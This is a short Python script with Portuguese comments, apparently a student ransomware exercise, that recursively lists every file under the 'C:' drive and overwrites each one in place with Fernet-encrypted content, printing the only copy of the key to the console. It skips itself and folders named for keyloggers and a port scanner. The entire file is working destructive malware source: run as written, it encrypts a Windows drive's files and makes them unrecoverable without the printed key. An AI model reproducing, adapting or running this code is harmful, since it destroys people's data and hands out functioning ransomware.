from cryptography.fernet import Fernet
import os
import sys

# Função para criptografar os arquivos
def enc_file(key, files):
    for file_path in files:
        with open(file_path, 'rb') as bin_file:
            content = bin_file.read()
        # Criptografar o conteúdo
        encrypted_content = Fernet(key).encrypt(content)
        # Escrever o conteúdo criptografado de volta no arquivo
        with open(file_path, 'wb') as bin_file:
            bin_file.write(encrypted_content)
        print(f'Arquivo criptografado: {file_path}')

# Função para listar os arquivos a serem criptografados
def list_files(base_dir):
    all_files = []
    for entry in os.listdir(base_dir):
        full_path = os.path.abspath(os.path.join(base_dir, entry))
        if os.path.isdir(full_path) and entry not in ['__pycache__', 'keylg_1', 'keylg_2', 'port_scan']:
            all_files += list_files(full_path)
        elif os.path.isfile(full_path) and os.path.basename(full_path) not in IGN_ARQUIVO:
            all_files.append(full_path)
    return all_files

def main():
    global IGN_ARQUIVO
    IGN_ARQUIVO = [os.path.basename(__file__), 'ramsonware.py']  # Arquivos a serem ignorados

    # Caminho completo para a pasta 'arquivos'
    dir = 'C:' # Defina o diretório onde os arquivos que serão criptografados estão

    # Listar os arquivos no diretório
    arqs = list_files(dir)

    # Gerar chave de criptografia
    key = Fernet.generate_key()
    print(f'Chave de criptografia (guarde-a para descriptografar): {key.decode()}')

    # Criptografar os arquivos listados
    enc_file(key, arqs)

if __name__ == "__main__":
    main()
